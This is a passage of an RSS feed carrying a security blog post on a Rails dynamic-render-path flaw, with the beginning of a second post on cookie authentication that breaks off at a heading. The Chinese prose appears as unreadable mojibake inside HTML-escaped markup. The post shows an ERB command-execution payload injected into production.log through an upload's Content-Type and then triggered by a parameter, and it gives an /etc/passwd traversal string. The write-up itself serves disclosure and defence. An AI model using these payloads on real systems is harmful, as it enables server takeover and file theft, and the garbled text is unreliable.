&lt;p&gt;é€šå¸¸åœ¨ Rails ç’°å¢ƒä¸‹èƒ½å¤ è®€å–ä»»æ„æª”æ¡ˆï¼Œæ”»æ“Šè€…æœƒå„ªå…ˆå°‹æ‰¾ secret_tokenï¼Œç›®çš„æ˜¯è®Šé€ æƒ¡æ„ session cookie åˆ©ç”¨ Marshal serialize çš„å•é¡Œåš &lt;a href=&quot;http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/&quot;&gt;RCE&lt;/a&gt;ã€‚ç„¶è€Œåœ¨æœ¬æ¡ˆä¾‹ç³»çµ±ä½¿ç”¨äº† Rails 4.1 å¾Œçš„ç‰ˆæœ¬ï¼ŒRails 4.1 é è¨­ä½¿ç”¨äº† JSON-based çš„ serializer é˜²æ­¢äº†ä¹‹å‰çš„ RCE å•é¡Œï¼Œæ‰€ä»¥ä¸¦æ²’æœ‰è¾¦æ³•è¼•é¬†åˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;ç‚ºäº†å–å¾—ç³»çµ±æ“ä½œæ¬Šï¼Œæˆ‘å€‘å˜—è©¦å°‹æ‰¾å…¶ä»–å¯åˆ©ç”¨çš„åœ°æ–¹ã€‚åœ¨é€™é‚Šæˆ‘å€‘ç™¼ç¾äº†è©²ç«™ç³»çµ± production.log ä¸­å­˜åœ¨ AWS çš„ä¸Šå‚³ç´€éŒ„ã€‚å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&quot;upload_001&quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;æ–¼æ˜¯æˆ‘å€‘å¯ä»¥åˆ©ç”¨ä¸Šå‚³æª”æ¡ˆçš„ Content-Type å…§å®¹ï¼Œå°‡ Embedded Ruby èªå¥ &amp;lt;%=`#{params[:devcore]}`%&amp;gt; æ·»åŠ åˆ° production.log æª”æ¡ˆè£¡é¢ã€‚æ–¼æ˜¯ log çš„å…§å®¹è®Šæˆäº†ä¸‹é¢é€™æ¨£ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&quot;upload_001&quot;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.040211&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;%=`&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:devcore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`%&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&quot;upload_002&quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;æ¥è‘—ï¼Œæˆ‘å€‘å°±å¯ä»¥åˆ©ç”¨å‰é¢çš„å¼±é»è®€å– production.log æª”æ¡ˆï¼Œå†å¸¶ä¸€å€‹ devcore åƒæ•¸ä½œç‚ºæŒ‡ä»¤ï¼Œå¦‚åœ–ï¼ŒæˆåŠŸå–å¾—ç³»çµ±æ“ä½œæ¬Š :p&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_RCE.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_RCE.png&quot; alt=&quot;Rails render Remote Code Execution&quot; title=&quot;Rails render Remote Code Execution&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é¢¨éšªåŸå› &quot;&gt;é¢¨éšªåŸå› &lt;/h3&gt;

&lt;p&gt;ä¸€èˆ¬ä¾†èªª Rails é–‹ç™¼ä¸¦ä¸å¤ªæœƒé€™æ¨£å¯«ï¼Œä½†ç¨å¾®æœå°‹ä¸€ä¸‹ Github é‚„æ˜¯èƒ½ç™¼ç¾é€™ç¨®å¯«æ³•å­˜åœ¨ä¸€äº›å°ˆæ¡ˆä¸­ã€‚æˆ‘æƒ³ä¸»è¦åŸå› å¤šåŠæ˜¯é–‹ç™¼è€…æƒ³è¦å·æ‡¶ï¼Œç„¶å¾Œä¹Ÿå¯èƒ½æƒ³èªªå‹•æ…‹æ¨£æ¿è·¯å¾‘é ‚å¤šå°±è¢«çœ‹åˆ°é¢æ¿çš„ htmlï¼Œç„¡å‚·å¤§é›…ã€‚èª°çŸ¥é“å°±å› ç‚ºé€™æ¨£å°è‡´æ•´å€‹ç¨‹å¼ç¢¼å…§å®¹è¢«è®€å–ã€‚&lt;/p&gt;

&lt;p&gt;è‹¥æœ‰ä¸€å€‹ action è¦å‹•æ…‹é¡¯ç¤ºä¸åŒæ¨¡ç‰ˆçš„éœ€æ±‚ï¼Œç‚ºäº†é¿å…ä¸Šè¿°çš„å•é¡Œï¼Œå°±è¾›è‹¦é»å…ˆç”¨ caseâ€¦when å»åˆ¤æ–·å§ã€‚é€™è·Ÿä¸è¦ç”¨å­—ä¸²çµ„ SQL èªå¥é¿å… SQL injection ä¸€æ¨£ï¼Œé€™ç¨®å¤–é¢å‚³é€²ä¾†çš„åƒæ•¸éƒ½è¦è¬¹æ…è™•ç†çš„è§€å¿µè¦å…§åŒ–åœ¨é–‹ç™¼ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;é™¤äº†é–‹ç™¼è€…åŸºæœ¬ä¸Šä¸æ‡‰è©²é€™æ¨£é–‹ç™¼å¤–ï¼ŒRails æœ¬èº«ä¹Ÿæœ‰ä¸€é»é»å•é¡Œï¼Œç•¶ render è·¯å¾‘æ²’æœ‰å‰¯æª”åï¼Œç„¡æ³•åˆ¤æ–·ä»€éº¼æ ¼å¼æ™‚ï¼Œå°±æœƒç›´æ¥æ¡ç”¨é è¨­çš„ template handlerã€‚&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/resolver.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;extract_handler_and_format_and_variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_formats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shift&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;The file &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; did not specify a template handler. The default is currently ERB, &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
              &lt;span class=&quot;s2&quot;&gt;&quot;but will change to RAW in the future.&quot;&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;ActiveSupport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;warn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;handler_for_extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EXTENSIONS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:variants&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;last&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;è€Œé€™è£¡é è¨­çš„ handler æ˜¯ ERBï¼ˆè¦‹ register_default_template_handlerï¼‰ï¼Œæ‰€ä»¥æœ‰æœ¬ç¯‡å¾Œé¢æåˆ°çš„é€²éšæ”»æ“Šï¼Œå¯ä»¥è¢«åˆ©ç”¨ä¾† RCEã€‚&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/handlers.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;extended&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_default_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:erb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ERB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:ruby&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_proc&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;æ…¶å¹¸çš„æ˜¯ï¼Œç›®å‰ Rails å·²ç¶“æŠŠé è¨­çš„ template handler å¾ ERB æ”¹æˆ RAWï¼Œä¸æœƒè¼•æ˜“æŠŠè¦ render çš„æª”æ¡ˆç•¶æˆ ERB åŸ·è¡Œäº†ã€‚è©³ç´°çš„å…§å®¹è«‹åƒè€ƒé€™å€‹ &lt;a href=&quot;https://github.com/rails/rails/commit/4be859f0fdf7b3059a28d03c279f03f5938efc80&quot;&gt;commit&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;Ruby on Rails èƒ½è®“é–‹ç™¼è€…è¼ƒè¼•é¬†çš„é–‹ç™¼å‡ºå®‰å…¨çš„æ‡‰ç”¨ç¨‹å¼ï¼Œç„¶è€Œï¼Œè‹¥é–‹ç™¼è€…ä¸æ³¨æ„ï¼Œé‚„æ˜¯æœ‰å¯èƒ½å¯«å‡ºåš´é‡çš„æ¼æ´ã€‚æœ¬æ–‡çš„å‹•æ…‹æ¨£æ¿è·¯å¾‘å°±æ˜¯é€™æ¨£ä¸€å€‹ä¾‹å­ï¼Œå®ƒä¸åªæ˜¯ OWASP æ‰€æè¿°çš„å¯ä»¥å­˜å–ä»»æ„æ¨¡ç‰ˆè€Œå·²ï¼Œå®ƒå¯ä»¥éæ­·æª”æ¡ˆï¼Œç”šè‡³å› ç‚º rails é è¨­çš„ template handler æ˜¯ ERBï¼Œé€ æˆé ç«¯å‘½ä»¤åŸ·è¡Œè®“æ”»æ“Šè€…å–å¾—ä¼ºæœå™¨æ“ä½œæ¬Šã€‚&lt;/p&gt;

&lt;p&gt;é€™å€‹ä¾‹å­åˆå†æ¬¡é©—è­‰ï¼Œæ¡†æ¶å¯ä»¥å¹«åŠ©å¤§å®¶å¿«é€Ÿé–‹ç™¼ï¼Œå¢åŠ å®‰å…¨åº¦ã€‚ä½†å”¯æœ‰è‰¯å¥½çš„å®‰å…¨æ„è­˜ï¼Œæ‰æ˜¯æ‡‰ç”¨ç¨‹å¼å®‰å…¨çš„åŸºçŸ³ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¨»è§£&quot;&gt;è¨»è§£&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;Dynamic Render Paths ç›®å‰ä¸¦æ²’æœ‰ä¸­æ–‡ç¿»è­¯ï¼Œå› ç‚ºå•é¡Œä¹‹ç²¾é«“åœ¨æ–¼è¦ç”¢ç”Ÿçš„æ¨£æ¿è·¯å¾‘æ˜¯å¯è®Šå‹•çš„ï¼Œå› æ­¤ç­†è€…èªç‚ºå‹•æ…‹æ¨£æ¿è·¯å¾‘é€™å€‹ç¿»è­¯è¼ƒç‚ºè²¼åˆ‡ã€‚Â &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;ç­†è€…æ¸¬è©¦çš„ç’°å¢ƒç‚º Rails 4.1.4ï¼Œå…¶ä»– Rails ç‰ˆæœ¬æœ‰å¯èƒ½éœ€è¦ç”¨ ../../../../../etc/passwd è·³è„«ç›®å‰ç›®éŒ„ã€‚Â &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/</link>
                <guid>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails</guid>
                <pubDate>Fri, 24 Jul 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>è«‡ Cookie èªè­‰å®‰å…¨ï¼ä»¥å®ç¢é›²ç«¯å”®ç¥¨ç‚ºä¾‹</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;Cookie æ˜¯é–‹ç™¼ç¶²é æ‡‰ç”¨ç¨‹å¼å¾ˆå¸¸åˆ©ç”¨çš„æ±è¥¿ï¼Œå®ƒæ˜¯ç‚ºäº†è§£æ±º HTTP stateless ç‰¹æ€§ä½†åˆéœ€è¦æœ‰äº’å‹•è€Œç”¢ç”Ÿçš„ã€‚é–‹ç™¼è€…æƒ³æŠŠä»€éº¼è³‡è¨Šæš«å­˜åœ¨ç”¨æˆ¶ç€è¦½å™¨éƒ½å¯ä»¥é€é Cookie ä¾†å®Œæˆï¼Œåªè¦è³‡è¨Šé‡ä¸å¤§æ–¼ç´„ 4KB çš„é™åˆ¶å°±æ²’å•é¡Œã€‚åœ¨é€™æ¨£çš„ç©ºé–“è£¡ï¼Œå¯ä»¥æ”¾è³¼ç‰©è»Šå…§çš„æš«å­˜å•†å“ã€å¯ä»¥å„²å­˜è®€è€…é–±è®€è¨˜éŒ„ä»¥ç²¾æº–æ¨è–¦ç”¢å“ã€ç•¶ç„¶ä¹Ÿå¯ä»¥å¯«å…¥ä¸€äº›èªè­‰è³‡è¨Šè®“ä½¿ç”¨è€…èƒ½ä¿æŒç™»å…¥ç‹€æ…‹ã€‚&lt;/p&gt;

&lt;p&gt;Cookie æœ‰ä¸€äº›å…ˆå¤©ä¸Šçš„ç¼ºé»ï¼Œåœ¨æ–¼è³‡æ–™æ˜¯å„²å­˜åœ¨ç€è¦½å™¨ç«¯ï¼Œè€Œä½¿ç”¨è€…æ˜¯å¯ä»¥ä»»æ„ä¿®æ”¹é€™äº›è³‡æ–™çš„ã€‚æ‰€ä»¥å¦‚æœç¶²ç«™çš„ä½¿ç”¨è€…èº«åˆ†èªè­‰è³‡è¨Šä¾è³´ Cookieï¼Œå·å·ç«„æ”¹é‚£äº›èªè­‰è³‡è¨Šï¼Œä¹Ÿè¨±æœ‰æ©Ÿæœƒèƒ½å¤ æ¬ºé¨™ç¶²ç«™ï¼Œç›œç”¨ä»–äººèº«åˆ†ï¼Œä»Šå¤©å°±ä¾†è«‡è«‡é€™æ¨£çš„ä¸€ä»¶äº‹æƒ…å§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å•é¡Œèˆ‡å›å ±&quot;&gt;å•é¡Œèˆ‡å›å ±&lt;/h3&gt;

